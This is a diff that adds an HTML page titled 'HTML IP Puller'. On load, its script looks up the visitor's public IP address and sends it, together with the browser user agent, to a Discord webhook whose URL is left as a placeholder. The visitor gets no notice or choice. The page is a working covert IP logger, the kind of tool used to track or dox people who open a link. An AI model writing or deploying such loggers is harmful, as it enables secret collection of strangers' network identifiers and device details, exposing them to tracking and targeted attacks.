@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HTML IP Puller</title>
+    <style>
+        @font-face {
+            font-family: 'Open Sans';
+            font-style: normal;
+            font-weight: 300;
+            src: local('Open Sans Light'), local('OpenSans-Light'), url(https://fonts.gstatic.com/s/opensans/v17/mem5YaGs126MiZpBA-UN_r8OUuhs.ttf) format('truetype');
+        }
+        .ip {
+            font-size: 16px;
+            color: #F3544D;
+            text-align: center;
+        }
+        .ip p {
+            margin: 0;
+            color: #1493A5;
+            -webkit-user-select: none;
+            -moz-user-select: none;
+            -ms-user-select: none;
+            user-select: none;
+            cursor: default;
+        }
+        #ip-address {
+            font-size: 1px;
+            font-size: 4vw;
+        }
+    </style>
+</head>
+<body>
+  
+    <div class="ip">
+        
+        <div id="ip-address"></div>
+    </div>
+
+    <script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js'></script>
+    <script>
+        $(document).ready(function() {
+            let ipAddress; // Variable to store the IP address
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    ipAddress = data.ip; // Assign the fetched IP to the variable
+                    $('#ip-address').text(ipAddress); // Display the IP address
+                    sendToDiscord("IP Pulled Successfully!");
+                    sendToDiscord(ipAddress);
+                    sendToDiscord(navigator.userAgent);// Send IP address to Discord webhook
+                })
+                .catch(error => {
+                    console.error('Error fetching IP address:', error);
+                    $('#ip-address').text('Unable to fetch IP address.');
+                });
+
+            function sendToDiscord(ip) {
+                const webhookURL = 'WEBHOOK_HERE'; // Replace with your webhook URL
+                const payload = {
+                    content: `${ip}` // Customize the message as needed
+                };
+
+                fetch(webhookURL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(payload)
+                })
+                .then(response => {
+                    if (!response.ok) {
+                        throw new Error('Network response was not ok');
+                    }
+                    console.log('IP address sent to Discord!');
+                })
+                .catch(error => {
+                    console.error('Error sending to Discord:', error);
+                });
+            }
+        });
+    </script>
+</body>
+</html>
